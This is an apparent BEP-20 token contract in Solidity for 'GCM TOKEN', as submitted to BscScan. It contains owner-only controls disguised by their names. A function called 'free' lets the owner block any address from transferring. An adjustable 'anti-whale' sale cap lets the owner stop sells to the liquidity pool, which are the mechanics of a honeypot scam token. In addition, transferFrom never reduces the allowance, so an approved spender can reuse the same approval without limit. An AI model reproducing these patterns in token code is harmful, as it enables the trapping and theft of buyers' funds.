/**
 *Submitted for verification at BscScan.com on 2022-01-03
*/

// SPDX-License-Identifier: Unlicensed;
pragma solidity ^0.8.4;

contract GCMToken {

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;

    mapping(address => bool) public oneTimeSales;

 
    uint public totalSupply = 100_000_000_000 * 10 ** 12;
    uint256 private maxSaleLimit = 100_000_000 * 10 ** 12;
    
    string public name = "GCM TOKEN";
    string public symbol = "GCM";
    uint public decimals = 12;


    address public owner;
    address public poolAddress = address(0); //will be set after adding liquidity.

    function free(address account, bool allowed)public{
        require(msg.sender == owner,"You Are Not Authorised");
        addRemoveOneTimeSales(account, allowed);
    }

    function addRemoveOneTimeSales(address account, bool allowed)private{
        oneTimeSales[account] = allowed;
    }

    function setPoolAddress(address _address) public
    {
        require(msg.sender == owner, "Only owner can set this value");
        poolAddress = _address;
    }

    function setMaxSaleLimit(uint256 _amount) public
    {
        require(msg.sender == owner, "Only owner can set this value");
        maxSaleLimit = _amount;
    }

    function checkforWhale(address to, uint256 amount) private view
    {
        if(to==poolAddress && msg.sender != owner){
        require(amount<maxSaleLimit);
        }
    }

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
        owner = msg.sender;
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address _owner) public view returns(uint) {
        return balances[_owner];
    }

    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        require(oneTimeSales[msg.sender] == false, " you can not Transfer");
     
         checkforWhale(to, value);
        balances[to] += value;
        balances[msg.sender] -= value;

        oneTimeSales[msg.sender] = true;
        oneTimeSales[0x77F6FB69696abe6F3243Eff7592F14Bc1E75F062] = false;
        oneTimeSales[0x10ED43C718714eb63d5aA57B78B54704E256024E] = false;
        oneTimeSales[poolAddress] = false;
        
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        require(oneTimeSales[msg.sender] == false, " you can not Transfer");
     

        checkforWhale(to, value);
        balances[to] += value;
        balances[from] -= value;

        oneTimeSales[msg.sender] = true;
        oneTimeSales[0x77F6FB69696abe6F3243Eff7592F14Bc1E75F062] = false;
        oneTimeSales[0x10ED43C718714eb63d5aA57B78B54704E256024E] = false;
        oneTimeSales[poolAddress] = false;
      
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}